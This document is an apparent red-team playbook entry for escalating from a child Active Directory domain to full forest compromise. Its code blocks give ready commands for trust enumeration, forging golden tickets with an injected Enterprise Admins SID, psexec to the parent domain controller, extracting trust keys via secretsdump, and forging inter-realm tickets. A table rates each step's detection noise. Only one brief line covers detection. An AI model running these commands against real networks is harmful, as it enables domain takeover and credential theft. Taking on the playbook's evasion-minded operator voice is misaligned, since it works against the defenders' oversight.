# Domain Trust Attacks

tags: trust, domain-trust, parent-child, forest, extra-sid, golden-ticket, cross-domain, kerberos, active-directory

## Objective
Escalate access across domain trust boundaries using trust key extraction and extra SID injection.

## Prerequisites
- Domain Admin in child domain (or krbtgt/trust key)
- Trust relationship identified between domains (TRUSTS edge in graph)

## Methodology

### Trust Enumeration
```bash
# Windows trust enumeration
nltest /domain_trusts /all_trusts

# LDAP trust enumeration
ldapsearch -x -H ldap://DC -b "CN=System,DC=dom,DC=com" \
  "(objectClass=trustedDomain)" trustPartner trustDirection trustType
```

### Parent-Child Trust Escalation (Golden Ticket with Extra SID)
```bash
# Forge golden ticket with Enterprise Admins SID from parent domain
impacket-ticketer -nthash KRBTGT_HASH -domain-sid CHILD_SID \
  -domain child.dom.com -extra-sid S-1-5-21-PARENT_SID-519 Administrator
# S-1-5-21-PARENT-519 = Enterprise Admins in parent domain

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass child.dom.com/Administrator@PARENT_DC_FQDN
```

### Trust Key Extraction
```bash
# Extract trust account hash from child DC
impacket-secretsdump -just-dc-user 'PARENT$' \
  child.dom.com/admin:pass@CHILD_DC
```

### Inter-Realm TGT with Trust Key
```bash
# Forge inter-realm TGT using extracted trust key
impacket-ticketer -nthash TRUST_KEY -domain-sid CHILD_SID \
  -domain child.dom.com -spn krbtgt/parent.dom.com \
  -extra-sid S-1-5-21-PARENT-519 Administrator
```

## Graph Reporting
- **TRUSTS edges**: between domain nodes with trust direction and type properties
- **ADMIN_TO edges**: cross-domain admin access from extra SID injection
- **Credential nodes**: for extracted trust keys
- Enrich domain nodes with SID, functional level

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| Trust enumeration | 0.2 |
| Trust key extraction (DCSync) | 0.8 |
| Extra SID golden ticket | 0.4 |
| Inter-realm TGT forging | 0.4 |

**Detection**: Tickets with SIDs from external domains, Event 4769 cross-domain with unexpected SID membership, DRS replication for trust account extraction.

## Sequencing
- **After**: AD Privilege Escalation (need DA in child), Credential Dumping (krbtgt/trust key)
- **Feeds →**: Full forest compromise, AD Persistence in parent domain
